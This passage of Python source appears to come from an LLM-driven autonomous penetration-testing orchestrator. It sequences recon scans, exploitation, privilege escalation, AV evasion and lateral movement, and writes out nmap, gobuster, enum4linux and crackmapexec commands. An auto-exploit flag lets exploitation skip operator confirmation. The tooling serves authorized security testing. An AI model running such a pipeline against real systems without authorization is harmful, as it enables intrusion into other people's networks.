                content      = f"Open ports: {self._intel['open_ports']}\nServices: {_fmt_svcs(self._intel['services'])}\nOS: {self._intel.get('os_guess','unknown')}",
                severity     = "info",
                mitre_tech   = "T1046"
            )
            await self._map_mitre("nmap", success=True)

        # ── PIVOT-TO-EXPLOIT SHORT-CIRCUIT ────────────────────
        # When OSINT synthesis or finding-triggers produced concrete
        # first-strike commands (intel["next_commands"] populated AND
        # pivot_to_exploit set), there is NO benefit to running the
        # remaining VULN_ANALYSIS + ATTACK_PLANNING phases — both of
        # them are LLM-only synthesis passes that will conclude
        # "execute the next_commands you already have."  In the
        # failed-engagement post-mortem these two phases ate 90+
        # minutes of wall-clock without producing a single attempted
        # exploit.  A real pentester moves to action the moment a
        # viable entry point is identified.
        if self._intel.get("pivot_to_exploit") and self._intel.get("next_commands"):
            await self.emit_reasoning(
                step       = "skip_vuln_attack_planning",
                reasoning  = (
                    f"OSINT identified {len(self._intel.get('next_commands', []))} "
                    f"concrete first-strike command(s) "
                    f"(reason: {self._intel.get('pivot_reason','')[:120]}). "
                    f"Skipping VULN_ANALYSIS + ATTACK_PLANNING — both phases "
                    f"would only confirm what intel already says.  Moving "
                    f"directly to EXPLOIT first-strike."
                ),
                decision   = "PHASE SKIP — VULN_ANALYSIS + ATTACK_PLANNING",
                next_action= "Enter EXPLOITATION and consume pre-staged next_commands",
            )
            # Set lightweight placeholders so downstream code that
            # reads attack_tree doesn't crash.
            self._intel.setdefault("attack_tree", {
                "source":        "pivot_short_circuit",
                "nodes":         [],
                "edges":         [],
                "optimal_path":  self._intel.get("next_commands", [])[:6],
                "reason":        self._intel.get("pivot_reason", ""),
            })
            attack_tree = self._intel.get("attack_tree")
        else:
            # ── PHASE 3: VULNERABILITY ANALYSIS ───────────────────
            await self._transition_state("VULNERABILITY_ANALYSIS")
            if self._intel.get("cves") or self._intel.get("vulnerabilities"):
                await self._capture_evidence(
                    phase        = "vuln_id",
                    evidence_type= "command_transcript",
                    title        = f"Vulnerability analysis — {len(self._intel.get('cves',[]))} CVEs found",
                    content      = f"CVEs: {self._intel.get('cves',[])}\nVulns: {str(self._intel.get('vulnerabilities',[]))[:500]}",
                    severity     = "high" if self._intel.get("cves") else "medium"
                )

            # ── PHASE 4: ATTACK PLANNING (new) ────────────────────
            await self._transition_state("ATTACK_PLANNING")
            if not already_done("attack_planning"):
                attack_tree = await self._phase_attack_planning(target)
                if attack_tree:
                    self._intel["attack_tree"] = attack_tree
                self._phases_completed.append("attack_planning")
            else:
                attack_tree = self._intel.get("attack_tree")

        # ── PHASE 5: EXPLOITATION ─────────────────────────────
        await self._apply_pending_guidance()   # drain before exploit gate
        await self._transition_state("EXPLOITATION")
        if phase_enabled("exploit") and not already_done("exploit"):
            if self._auto_exploit:
                await self._phase_exploit(target)
            else:
                await self._emit("awaiting_confirmation", {
                    "phase":   "exploit",
                    "message": "Attack plan ready. Confirm to begin exploitation.",
                    "intel":   self._intel,
                    "attack_tree": attack_tree
                })
                confirmed = await self._wait_for_confirmation("exploit", timeout=3600)
                if confirmed:
                    await self._phase_exploit(target)
                    self._phases_completed.append("exploit")
                else:
                    await self._emit("phase_skipped", {"phase": "exploit"})
            await self._drain_pending_corrections("exploit")
        elif already_done("exploit"):
            await self.emit_reasoning(
                step="exploit_skipped", reasoning="Exploit phase completed before pause",
                decision="Skipping exploit phase", next_action="Continue to post-exploit"
            )

        # ── AUTO-CHECKPOINT 3: after exploitation ─────────────
        await self._check_pause("exploit")

        # ── PHASE 6: POST-EXPLOITATION + PRIVESC ──────────────
        if self._intel["shell_access"]:
            await self._transition_state("POST_EXPLOITATION")
            if phase_enabled("post_exploit") and not already_done("post_exploit"):
                await self._phase_post_exploit(target)
                self._phases_completed.append("post_exploit")
                await self._drain_pending_corrections("post_exploit")

            await self._transition_state("PRIVILEGE_ESCALATION")
            if phase_enabled("privesc") and not already_done("privesc"):
                await self._phase_privesc(target)
                self._phases_completed.append("privesc")
                # Store privesc success in long-term memory
                if self._intel.get("root_flag") or self._intel.get("current_user") == "root":
                    await self._store_success_memory(
                        memory_type = "privesc_pattern",
                        content     = {
                            "os":      self._intel.get("os_guess","?"),
                            "method":  "See attack path",
                            "vectors": self._intel.get("attack_path", [])[-3:]
                        },
                        tags = ["privesc", self._intel.get("os_guess","unknown").lower()]
                    )

            # ── PHASE 6b: EVASION (when shell active) ─────────
            # Run defense enumeration + AV evasion after initial access
            if phase_enabled("evasion") and not already_done("evasion"):
                await self._phase_evasion(target)
                self._phases_completed.append("evasion")

            # ── PHASE 7: LATERAL MOVEMENT ─────────────────────
            await self._transition_state("LATERAL_MOVEMENT")
            if phase_enabled("lateral") and not already_done("lateral"):
                await self._phase_lateral_movement(target)
                self._phases_completed.append("lateral")
            elif phase_enabled("exploit") and self._intel.get("lateral_targets") and not already_done("lateral"):
                # Legacy: also trigger if exploit phase found lateral targets
                await self._phase_lateral_movement(target)
                self._phases_completed.append("lateral")

        # ── PHASE 7b: WIRELESS (optional standalone phase) ────
        if (phase_enabled("wireless") or self._intel.get("wireless_config")) and not already_done("wireless"):
            await self._phase_wireless(target)
            self._phases_completed.append("wireless")

        # ── PHASE 7c: IoT ASSESSMENT (auto-detected or explicit) ──────────────
        if (phase_enabled("iot") or self._intel.get("_iot_detected")) and not already_done("iot"):
            await self._phase_iot(target)
            self._phases_completed.append("iot")

        # ── PHASE 8: EVIDENCE COLLECTION ─────────────────────
        # Sync gate: every agent must be IDLE before evidence is collected.
        # This ensures exploit/privesc/post-exploit LLM parse steps are done.
        await self.emit_reasoning(
            step       = "pre_evidence_sync",
            reasoning  = "Waiting for all active agents to finish before evidence collection",
            decision   = "Master holding until all agents confirm idle",
            next_action= "Evidence collection starts once all agents are done"
        )
        await self._wait_for_agents_idle(timeout=300.0)
        await self._transition_state("EVIDENCE_COLLECTION")

        # ── Enhanced evidence: screenshot + flag capture (EvidenceAgent) ──
        if self._intel.get("shell_access") and phase_enabled("evidence") and not already_done("evidence"):
            await self._phase_evidence_enhanced(target)
            self._phases_completed.append("evidence")

        # ── Forensics deep-dive: timeline + artifacts + memory ────────────
        if phase_enabled("forensics") and not already_done("forensics"):
            await self._phase_forensics_deep(target)
            self._phases_completed.append("forensics")

        # ── COMPROMISE-READINESS GATE (force a real foothold attempt) ──────
        try:
            await self._final_compromise_gate(session_id, target)
        except Exception:
            pass

        await self._phase_evidence_collection(session_id, target)

        # ── PHASE 9: REPORT GENERATION ────────────────────────
        # Final sync gate: report must never start while any agent is still active.
        # This is the definitive guard that prevents the original bug.
        await self.emit_reasoning(
            step       = "pre_report_sync",
            reasoning  = "All agents must be idle before report generation can begin",
            decision   = "Master confirming all agents idle before writing report",
            next_action= "Report generation starts once all agents confirm done"
        )
        await self._wait_for_agents_idle(timeout=120.0)
        await self._emit("plan_step_update", {
            "step_id": "reporting", "status": "active",
            "result":  "Generating penetration test report",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })
        await self._transition_state("REPORT_GENERATION")
        await self._phase_reporting(session_id, target)
        await self._emit("plan_step_update", {
            "step_id": "reporting", "status": "done",
            "result":  "Penetration test report ready",
            "detail":  f"Findings: {self._intel.get('findingsSummary',{})} | Flags: {len([self._intel.get('user_flag'), self._intel.get('root_flag')])}",
            "found":   True, "ts": datetime.utcnow().isoformat()
        })
        await self._transition_state("COMPLETE")

        # Cancel the background guidance drain task — scan is complete
        _drain_task.cancel()
        try:
            await _drain_task
        except asyncio.CancelledError:
            pass

        # Cancel meta-agent background listener
        if self._meta_listener_task and not self._meta_listener_task.done():
            self._meta_listener_task.cancel()
            try:
                await self._meta_listener_task
            except asyncio.CancelledError:
                pass

    # ─── Agent Sync Gate ──────────────────────────────────────

    async def _wait_for_agents_idle(self, timeout: float = 300.0):
        """
        Block until ALL specialist agents AND all fire-and-forget background
        tasks have finished.

        Two-tier check:
          1. Named agent objects (recon, vuln, web, osint, exploit, privesc) —
             checked via their .status field.
          2. Background asyncio.Task objects registered via _create_task() —
             checked via task.done().

        Called before any phase transition that must only start after all
        previously dispatched agents have completed — specifically before
        REPORTING so we never generate a report while subagents are still running.
        """
        import asyncio as _asyncio

        agent_objects = [
            ("recon",   self._recon_agent),
            ("vuln",    self._vuln_agent),
            ("web",     self._web_agent),
            ("osint",   self._osint_agent),
            ("exploit", self._exploit_agent),
            ("privesc", self._privesc_agent),
        ]

        deadline = _asyncio.get_event_loop().time() + timeout
        while _asyncio.get_event_loop().time() < deadline:
            busy = []

            # Check named agent statuses
            for name, agent in agent_objects:
                if agent is None:
                    continue
                status = str(agent.status).lower()
                if any(s in status for s in ("running", "thinking")):
                    busy.append(name)

            # Check background tasks registered via _create_task()
            pending_tasks = [t for t in self._background_tasks if not t.done()]
            if pending_tasks:
                busy.append(f"{len(pending_tasks)} background task(s)")

            if not busy:
                # All agents idle and all background tasks done — safe to proceed
                await self.emit_reasoning(
                    step       = "agents_sync",
                    reasoning  = "All agents and background tasks confirmed idle",
                    decision   = "Agent sync gate passed — proceeding",
                    next_action= "Continue to next phase"
                )
                return

            await self.emit_reasoning(
                step       = "agents_sync_waiting",
                reasoning  = f"Waiting for agents/tasks to finish: {busy}",
                decision   = f"{len(busy)} item(s) still active — Master waiting",
                next_action= "Check again in 2 seconds"
            )
            # Drain guidance queue while waiting so operator input is never blocked
            await self._apply_pending_guidance()
            await _asyncio.sleep(2.0)

        # Timeout — force-set all busy agents to IDLE, cancel pending tasks, and continue
        still_busy = []
        for name, agent in agent_objects:
            if agent is None:
                continue
            status = str(agent.status).lower()
            if any(s in status for s in ("running", "thinking")):
                still_busy.append(name)
                try:
                    await agent.set_status(AgentStatus.IDLE, "Sync timeout — Master proceeding")
                except Exception:
                    pass

        # Cancel any remaining background tasks
        for task in list(self._background_tasks):
            if not task.done():
                still_busy.append("background_task")
                task.cancel()

        if still_busy:
            await self.emit_reasoning(
                step       = "agents_sync_timeout",
                reasoning  = f"Sync timeout reached. Forcing idle: {still_busy}",
                decision   = "Proceeding despite agents not confirming idle",
                next_action= "Continue — agent results already captured in intel"
            )

    # ─── PHASE: Reconnaissance ────────────────────────────────

    async def _phase_recon(self, target: str, plan: Dict):
        """Master plans every recon task. Agent executes + extracts findings."""
        await self._apply_pending_guidance()
        await self._advance_phase(AttackPhase.RECON)
        await self._emit("plan_step_update", {
            "step_id": "recon", "status": "active",
            "result":  f"Master planning reconnaissance for {target}",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })

        from agents.recon_agent import ReconAgent
        agent = ReconAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._recon_agent = agent

        # ── Round 1: Master plans initial scan ────────────────
        recon_plan = self._safe_llm_result(await self._llm_plan_recon(target, plan))
        await self.emit_reasoning(
            step       = "recon_planning",
            reasoning  = recon_plan.get("reasoning",""),
            decision   = f"Strategy: {recon_plan.get('strategy','')}",
            next_action= f"{len(recon_plan.get('steps',[]))} tasks in parallel"
        )
        tasks = [
            {"tool": s["tool"], "args": s.get("args",target),
             "purpose": s.get("purpose",""), "timeout": s.get("timeout",300),
             "can_parallel": True}
            for s in _safe_list(recon_plan.get("steps")) if s.get("tool")
        ] or [
            {"tool":"nmap","args":f"-sS -sV -sC --open -p- --min-rate 3000 {target}",
             "purpose":"Full port scan","timeout":600,"can_parallel":True},
            {"tool":"whatweb","args":f"-a 3 http://{target}",
             "purpose":"Web tech detection","timeout":60,"can_parallel":True},
        ]
        # GUARANTEE a port scan runs. If the LLM's plan omitted nmap/masscan,
        # findings and intel stay empty → hypothesis engine shows "no open
        # ports" even when subagents later find them. Always prepend a full
        # scan when no scanner is in the plan.
        _has_port_scanner = any(
            (t.get("tool") or "").lower() in ("nmap", "masscan", "rustscan", "naabu")
            for t in tasks
        )
        if not _has_port_scanner:
            tasks.insert(0, {
                "tool":    "nmap",
                "args":    f"-sS -sV -sC --open -p- --min-rate 3000 {target}",
                "purpose": "Mandatory full port scan (LLM plan missed one)",
                "timeout": 600,
                "can_parallel": True,
            })
        result = await agent.execute_tasks(target, tasks, "RECON", self._intel)

        # ── State-corruption fix (Overpass-3 post-mortem) ──────────
        # Previously this used "=" which CLOBBERED the existing intel
        # any time recon was called a second time (resume / re-plan /
        # reasoning-loop retry) and the new result happened to be
        # empty.  Real-world impact: the master LLM saw "Ports open: 0"
        # for 11 iterations after the initial 8 ports had been
        # discovered — and burned 30 minutes asking for "another port
        # scan" each time.  We now MERGE instead.
        new_ports = result.get("open_ports") or []
        if new_ports:
            existing = list(self._intel.get("open_ports") or [])
            merged = list(dict.fromkeys(existing + list(new_ports)))
            self._intel["open_ports"] = merged
        # NEVER blank-overwrite: if recon returned nothing, keep what
        # we had.
        new_services = result.get("services") or {}
        if new_services:
            cur = dict(self._intel.get("services") or {})
            cur.update(new_services)
            self._intel["services"] = cur
        new_os = (result.get("os_guess") or "").strip()
        if new_os and new_os != "unknown":
            self._intel["os_guess"] = new_os
        # nmap -O is root-only and often does not run; if the scan-supplied
        # guess is still unknown, derive it from the -sV service banners +
        # open-port fingerprint so EVERY downstream tech-specific stage
        # (payload, shell, privesc, lateral/AD) routes correctly instead of
        # silently defaulting to Linux.
        if (self._intel.get("os_guess") or "unknown").strip().lower() in ("", "unknown"):
            try:
                self._detect_target_os()
            except Exception:
                pass
        new_paths = result.get("web_paths") or []
        if new_paths:
            cur_paths = list(self._intel.get("web_paths") or [])
            self._intel["web_paths"] = list(dict.fromkeys(cur_paths + new_paths))
        self._intel["service_versions"].update(result.get("service_versions",{}))
        for u in result.get("users",[]):
            if u not in self._intel["users"]: self._intel["users"].append(u)
        self._merge_raw_outputs(result.get("raw_outputs",{}))

        # ── Auto-detect IoT target from discovered ports ───────
        from agents.iot.iot_agent import is_iot_target
        if is_iot_target(self._target_type, self._intel["open_ports"],
                         self._intel.get("os_guess", "")):
            if not self._intel.get("_iot_detected"):
                self._intel["_iot_detected"] = True
                await self.emit_reasoning(
                    step       = "iot_autodetect",
                    reasoning  = f"IoT-characteristic ports detected on {self._target}. Enabling IoT assessment phase.",
                    decision   = "Auto-enable IoT phase",
                    next_action= "IoT testing will run after exploitation phase"
                )

        # ── Device-type classification (NEW) ──────────────────
        # Run the deterministic classifier over the recon evidence to
        # stamp `intel['device_classification']` with a TaxonomyKind +
        # playbook list.  Downstream phases / primer dispatchers will
        # use this to route per-device chains (IoT vs Linux vs DC vs
        # web app vs database).  Failure is non-fatal — we just keep
        # the legacy is_iot heuristic as the only signal.
        try:
            from agents.reasoning.device_classifier import classify_device
            web_tech = []
            for t in (result.get("technologies") or []):
                if isinstance(t, dict):
                    name = t.get("name") or t.get("tech") or ""
                    if name: web_tech.append(name)
                elif t:
                    web_tech.append(str(t))
            classification = classify_device(
                open_ports  = self._intel.get("open_ports") or [],
                services    = self._intel.get("services") or {},
                os_guess    = self._intel.get("os_guess") or "",
                web_tech    = web_tech,
                banners     = self._intel.get("banners") or {},
                target_kind = self._intel.get("target_kind") or "ip",
                raw_target  = self._target,
            )
            self._intel["device_classification"] = classification.to_dict()
            await self.emit_reasoning(
                step       = "device_classification",
                reasoning  = (
                    f"Recon evidence scored against device taxonomy — "
                    f"{classification.notes}"
                ),
                decision   = (
                    f"Classified as {classification.kind.value!r} "
                    f"(os={classification.os_family}, conf={classification.confidence:.2f}, "
                    f"priority={classification.priority})"
                ),
                next_action= (
                    f"Playbook chain: {' → '.join(classification.playbooks[:5])}"
                ),
            )
            await self._broadcast_raw({
                "type":       "device_classified",
                "session_id": self._session_id,
                "agent":      "master",
                "data": classification.to_dict(),
            })
        except Exception as _cl_err:
            import logging as _l
            _l.getLogger(__name__).warning(
                "device classifier failed (non-fatal): %s", _cl_err,
            )

        # ── Version inference from leaked distro banners (advisory) ───────
        # When a service hides its version (e.g. "Apache httpd" with no number)
        # but a sibling banner leaks the distro (OpenSSH's Ubuntu suffix), infer
        # the shipped package version to sharpen CVE matching downstream.
        try:
            from agents.exploit.exploitability import infer_distro_versions
            _ev = " ".join(
                str(v.get("version", "") if isinstance(v, dict) else v)
                for v in (self._intel.get("services") or {}).values()
            ) + " " + str(self._intel.get("os_guess", ""))
            _inf = infer_distro_versions(_ev)
            if _inf:
                self._intel["inferred_versions"] = _inf
                await self.emit_reasoning(
                    step       = "version_inference",
                    reasoning  = (
                        f"Banner leaks {_inf['distro']} → likely package versions: "
                        + ", ".join(f"{k} {v}" for k, v in _inf["versions"].items())
                    ),
                    decision   = "Use distro-default versions to sharpen CVE matching "
                                 "for services that hide their banner",
                    next_action= "Feed inferred versions into vuln/OSINT CVE search",
                )
        except Exception:
            pass

        # ── Round 2: Master plans service-specific enumeration ─
        ports = self._intel["open_ports"]
        svcs  = self._intel["services"]
        enum_tasks = []
        http_ports, smb_ports, ftp_ports, ssh_ports = [], [], [], []
        for port, svc in svcs.items():
            sn = (svc.get("service","") if isinstance(svc,dict) else str(svc)).lower()
            if any(x in sn for x in ("http","https","http-alt","ssl/http")): http_ports.append(port)
            elif any(x in sn for x in ("smb","microsoft-ds","netbios")):    smb_ports.append(port)
            elif "ftp" in sn:  ftp_ports.append(port)
            elif "ssh" in sn:  ssh_ports.append(port)

        for port in http_ports[:2]:
            proto = "https" if int(str(port)) in (443,8443) else "http"
            base  = f"{proto}://{target}:{port}"
            enum_tasks += [
                {"tool":"gobuster","timeout":240,"can_parallel":True,
                 "args":f"dir -u {base} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak -t 40 -q --no-error",
                 "purpose":f"Directory enum on {base}"},
                {"tool":"curl","timeout":15,"can_parallel":True,
                 "args":f"-sk -I {base}/ --max-time 10",
                 "purpose":f"HTTP headers from {base}"},
            ]
        if smb_ports or 445 in ports or 139 in ports:
            _os_guess = self._intel.get("os_guess", "").lower()
            _is_windows = "windows" in _os_guess
            if not _is_windows:
                # enum4linux queries Linux/Samba hosts — skip for confirmed Windows targets.
                # "linux_only" flag lets execute_tasks re-check os_guess at runtime
                # so a late nmap OS detection can still suppress it.
                enum_tasks.append(
                    {"tool":"enum4linux","args":f"-a {target}","timeout":120,"can_parallel":True,
                     "purpose":"SMB/NetBIOS full enumeration (Linux/Samba)","linux_only":True},
                )
            enum_tasks += [
                {"tool":"smbclient","args":f"-L //{target}/ -N","timeout":30,"can_parallel":True,
                 "purpose":"List SMB shares anonymously"},
                {"tool":"nmap","args":f"-p 445,139 --script smb-security-mode,smb2-security-mode,smb-os-discovery,smb-enum-shares {target}","timeout":60,"can_parallel":True,
                 "purpose":"SMB security mode and share discovery (Windows-compatible)"},
            ]
            if _is_windows:
                # Windows-specific SMB enumeration
                enum_tasks.append(
                    {"tool":"crackmapexec","args":f"smb {target} --shares","timeout":60,"can_parallel":True,
                     "purpose":"Windows SMB share and user enumeration"},
                )
        if ftp_ports or 21 in ports:
            enum_tasks.append({"tool":"nmap","timeout":60,"can_parallel":True,
                "args":f"-sV -p 21 --script ftp-anon,ftp-syst {target}",
                "purpose":"FTP anonymous login check"})
        if ssh_ports or 22 in ports:
            enum_tasks.append({"tool":"nmap","timeout":30,"can_parallel":True,
                "args":f"-p 22 --script ssh-auth-methods,ssh-hostkey {target}",
                "purpose":"SSH auth methods"})

        if enum_tasks:
            await self.emit_reasoning(
                step       = "recon_enum",
                reasoning  = f"HTTP={http_ports}, SMB={smb_ports}, FTP={ftp_ports}, SSH={ssh_ports}",
                decision   = f"Running {len(enum_tasks)} service-specific tasks in parallel",
                next_action= ", ".join(t["tool"] for t in enum_tasks[:5])
            )
            enum_r = await agent.execute_tasks(target, enum_tasks, "RECON_ENUM", self._intel)
            for k in ("login_pages","users","shares","interesting_files","web_paths"):
                for v in enum_r.get(k,[]):
                    if v not in self._intel[k]: self._intel[k].append(v)
            self._intel["service_versions"].update(enum_r.get("service_versions",{}))
            self._merge_raw_outputs(enum_r.get("raw_outputs",{}))
            # merge enum_r into result for interpretation
            # Uses _dedup_strings for string lists, direct extend for other lists
            _STRING_KEYS = {"open_ports","cves","web_paths","users","shares",
                            "interesting_files","login_pages","technologies","subdomains"}
            for k, v in enum_r.items():
                if isinstance(v, list):
                    if k in _STRING_KEYS:
                        # Safe dedup — items must be strings, not dicts
                        result[k] = _merge_string_lists(result.get(k,[]), v)
                    else:
                        # List of dicts (credentials, findings, etc.) — just extend, no set()
                        existing = result.get(k, [])
                        if isinstance(existing, list):
                            result[k] = existing + [i for i in v if i not in existing]
                        else:
                            result[k] = v
                elif isinstance(v, dict):
                    result.setdefault(k, {}).update(v)

        # ── Fire recon subagents in background (SubagentConsolePage + findings DB) ──
        await self._run_phase_subagents("recon", target)

        # ── Master interprets all findings ────────────────────
        interp = self._safe_llm_result(await self._llm_interpret_recon(target, {
            **result,
            "login_pages":       self._intel["login_pages"],
            "users":             self._intel["users"],
            "shares":            self._intel["shares"],
            "service_versions":  self._intel["service_versions"],
            "interesting_files": self._intel["interesting_files"],
        }))
        self._intel["attack_surface_notes"] = interp.get("assessment","")
        await self.emit_reasoning(
            step       = "recon_complete",
            reasoning  = interp.get("summary","Recon complete"),
            decision   = interp.get("assessment",""),
            next_action= interp.get("next_phase_focus",""),
            data       = {"ports": self._intel["open_ports"],
                          "login_pages": self._intel["login_pages"]}
        )
        self._intel["attack_path"].append({
            "phase":"recon", "result": interp.get("summary",""),
            "ts": datetime.utcnow().isoformat()
        })
        await self._emit("plan_step_update", {
            "step_id":  "recon",
            "status":   "done",
            "result":   interp.get("summary",""),
            "detail":   f"Ports: {self._intel.get('open_ports',[])} | OS: {self._intel.get('os_guess','?')} | Services: {len(self._intel.get('services',{}))}",
            "found":    len(self._intel.get("open_ports",[])) > 0,
            "ts":       datetime.utcnow().isoformat()
        })

    # ─── PHASE: Vulnerability Identification ──────────────────

    async def _phase_vuln_id(self, target: str):
        """Master decides every vuln check. Agent executes + extracts CVEs."""
        await self._apply_pending_guidance()
        await self._advance_phase(AttackPhase.VULN_ID)
        await self._emit("plan_step_update", {
            "step_id": "vuln_id", "status": "active",
            "result":  "Master planning vulnerability assessment",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })
        # Stamp phase start for the wall-clock budget check
        if self._context is not None:
            try:
                self._context.mark_phase_started("vuln_id")
            except Exception:
                pass

        # ── Phase-skip when pivot signal already raised ──────────────
        # If OSINT (or any pipeline) already identified a viable entry
        # point and set focused_attack endpoints / next_commands, there
        # is NO benefit to running generic VULN_ID scans for 12 minutes.
        # Skip to EXPLOIT immediately.
        try:
            if self._context is not None and (
                self._context.is_post_exploit_mode()
                or self._intel.get("pivot_to_exploit")
                or self._context.focused_attack_endpoints
            ):
                await self.emit_reasoning(
                    step       = "vuln_id_skip_pivot",
                    reasoning  = (
                        "VULN_ID skipped — a viable entry point is already "
                        "identified (pivot_to_exploit or focused_attack set). "
                        "Generic vuln-scans would only delay exploitation."
                    ),
                    decision   = "SKIP VULN_ID",
                    next_action= "Continue directly to EXPLOIT",
                )
                return
        except Exception:
            pass

        from agents.vuln_agent import VulnAgent
        agent = VulnAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._vuln_agent  = agent

        vuln_plan = self._safe_llm_result(await self._llm_plan_vuln_scan(target))
        await self.emit_reasoning(
            step       = "vuln_planning",
            reasoning  = vuln_plan.get("reasoning",""),
            decision   = f"Running {len(vuln_plan.get('checks',[]))} checks in parallel",
            next_action= "Targeted vuln scan based on exact service versions"
        )
        tasks = [
            {"tool": c["tool"], "args": c.get("args",""),
             "purpose": c.get("purpose",""), "timeout": c.get("timeout",300),
             "can_parallel": True}
            for c in _safe_list(vuln_plan.get("checks")) if c.get("tool")
        ]
        ports_str = ",".join(str(p) for p in self._intel.get("open_ports",[])[:30])
        if not tasks and ports_str:
            tasks = [
                {"tool":"nmap","args":f"--script vuln,safe -sV -p {ports_str} {target}",
                 "purpose":"NSE vuln scripts","timeout":600,"can_parallel":True},
                {"tool":"searchsploit","args":self._intel.get("os_guess","linux"),
                 "purpose":"ExploitDB OS search","timeout":30,"can_parallel":True},
            ]

        result = await agent.execute_tasks(target, tasks, "VULN_ID", self._intel)

        if result.get("cves"):
            self._intel["cves"] = _merge_string_lists(self._intel["cves"], result.get("cves",[]))
        self._merge_raw_outputs(result.get("raw_outputs",{}))

        # ── Fire vuln subagents in background ──────────────────
        await self._run_phase_subagents("vuln", target)

        vuln_analysis = self._safe_llm_result(await self._llm_prioritise_vulns(target, result))
        await self.emit_reasoning(
            step       = "vuln_analysis",
            reasoning  = vuln_analysis.get("reasoning",""),
            decision   = f"Priority: {vuln_analysis.get('priority_targets',[])}",
            next_action= vuln_analysis.get("exploit_recommendation",""),
            data       = vuln_analysis
        )
        self._intel["exploit_modules"] = vuln_analysis.get("exploit_modules",[])
        self._intel["attack_path"].append({
            "phase":"vuln_id",
            "result": f"CVEs: {self._intel['cves'][:5]} | Modules: {len(self._intel['exploit_modules'])}",
            "ts": datetime.utcnow().isoformat()
        })
        await self._emit("plan_step_update", {
            "step_id": "vuln_id",
            "status":  "done",
            "result":  vuln_analysis.get("reasoning","Vuln scan complete"),
            "detail":  f"CVEs: {self._intel['cves'][:5]} | Modules: {len(self._intel['exploit_modules'])}",
            "found":   len(self._intel.get("cves",[])) > 0,
            "ts":      datetime.utcnow().isoformat()
        })

    # ─── PHASE: Web Application Testing ──────────────────────

    async def _phase_web_testing(self, target: str, web_ports: List[int]):
        """
        Adaptive, staged web application testing.

        Stage 1 — Fingerprint : whatweb, headers, robots.txt, sitemap
        Stage 2 — Discovery   : tech-aware gobuster, CMS tools
        Stage 3 — Analysis    : classify paths (login/API/upload/forms)
        Stage 4 — Targeted    : SQLi, auth, SSRF, SSL, CMS exploits
        Stage 5 — Deep scan   : nikto, LFI, WebDAV, upload bypass

        Each stage feeds the next; no fire-and-forget background tasks.
        All tool output is visible in the event feed in real time.

        ── Profile-aware self-abort ─────────────────────────────────
        If the EngagementContext's target_profile classifier says the
        target has no web app surface (ad_dc, db_server, ssh_only,
        smb_only), this phase RETURNS IMMEDIATELY without running any
        tools.  This prevents the 90-minute WSTG fuzz storm that
        consumed the support.htb engagement.
        """
        # Profile-aware abort BEFORE any work is queued.  Two invocations
        # of _phase_web_testing in the same engagement (which was the
        # pathology in the support.htb run) both hit this guard.
        if self._context is not None:
            try:
                if self._context.should_skip_web_testing():
                    profile = self._context.get_target_profile()
                    await self.emit_reasoning(
                        step       = "web_testing_skipped_by_profile",
                        reasoning  = (
                            f"Target profile is {profile!r} — this target has "
                            f"no real web application surface, so the 14-phase "
                            f"WSTG playbook would only produce timeouts against "
                            f"closed ports.  Skipping web phase entirely."
                        ),
                        decision   = f"SKIP web_testing (profile={profile})",
                        next_action= "Proceed directly to exploit / post-exploit",
                    )
                    await self._emit("phase_skipped", {
                        "phase":   "web_testing",
                        "reason":  f"target_profile={profile}: no web app surface",
                    })
                    return
            except Exception:
                pass

        # Defensive coercion — callers (bootstrap, reasoning_loop) occasionally
        # pass a set/tuple. Slicing/indexing below requires a list.
        if not isinstance(web_ports, list):
            try:
                web_ports = sorted(int(str(p).split("/")[0]) for p in (web_ports or []))
            except Exception:
                web_ports = list(web_ports or [])
        # Web testing is a PARALLEL sub-phase that shares the VULN_ID state-machine
        # slot (exactly like _phase_cloud / _phase_container / _phase_traffic, which
        # deliberately do NOT call _advance_phase).  The previous
        # `_advance_phase(AttackPhase.VULN_ID)` here RE-STAMPED VULN_ID every time
        # web testing began — producing the cosmetic second "VULN_ID start" seen in
        # the run timeline and resetting phase-progress.  (Renaming to
        # AttackPhase.WEB_TESTING is NOT an option — that enum value does not exist
        # and would raise AttributeError.)  The phase_start emit below already
        # announces WEB_TESTING to the UI; no state-machine advance is needed.
        await self._emit("phase_start", {
            "phase":   "WEB_TESTING",
            "message": f"Adaptive web testing starting on {len(web_ports)} port(s): {web_ports[:5]}"
        })

        # ── Optional confirmation gate ───────────────────────────────────
        if self._confirm_web:
            await self._emit("awaiting_confirmation", {
                "phase":   "web_testing",
                "message": "Web application testing ready. Confirm to proceed.",
                "ports":   web_ports,
            })
            confirmed = await self._wait_for_confirmation("web_testing", timeout=3600)
            if not confirmed:
                await self._emit("phase_skipped", {"phase": "web_testing", "reason": "Not confirmed by operator"})
                return

        await self._apply_pending_guidance()

        # ── Vhost pre-probe ─────────────────────────────────────────────
        # Resolve IP→vhost BEFORE any web battery runs, so EVERY web tool
        # targets the real app instead of racing the bare IP (which only
        # 302-redirects to e.g. cctv.htb).  Deterministic single -I probe,
        # parsed for an internal-vhost redirect, recorded via the central
        # resolver.  Done inline (NOT via _dispatch_to_agent) so it can't
        # trigger the WebAgent battery prematurely.
        try:
            from agents.recon import target_resolver as _tr
            if not _tr.uses_vhost(self._intel):
                import subprocess as _sp
                _pp = web_ports[0] if web_ports else 80
                _scheme = "https" if int(str(_pp).split("/")[0]) in (443, 8443) else "http"
                _cp = _sp.run(
                    ["curl", "-sS", "-I", "-m", "8", "-k",
                     f"{_scheme}://{target}:{_pp}/"],
                    capture_output=True, timeout=12, check=False,
                )
                _probe = ((_cp.stdout or b"").decode("utf-8", "replace") +
                          (_cp.stderr or b"").decode("utf-8", "replace"))
                from agents.recon.vhost_pivot import extract_hostnames, remap_vhosts
                _vh = extract_hostnames(_probe)
                if _vh:
                    remap_vhosts(target, _vh)
                    _tr.record_vhost(self._intel, _vh[0], ip=target, verified=True)
                    await self.emit_reasoning(
                        step       = "vhost_preprobe",
                        reasoning  = (f"Port {_pp} on {target} redirects to vhost "
                                      f"{_vh[0]} — that hostname is the real web app. "
                                      f"All web tools will target it."),
                        decision   = f"SET web target = http://{_vh[0]}/",
                        next_action= "Run web testing against the vhost, not the bare IP",
                    )
        except Exception:
            pass

        from agents.web_agent import WebAgent
        agent = WebAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._web_agent   = agent

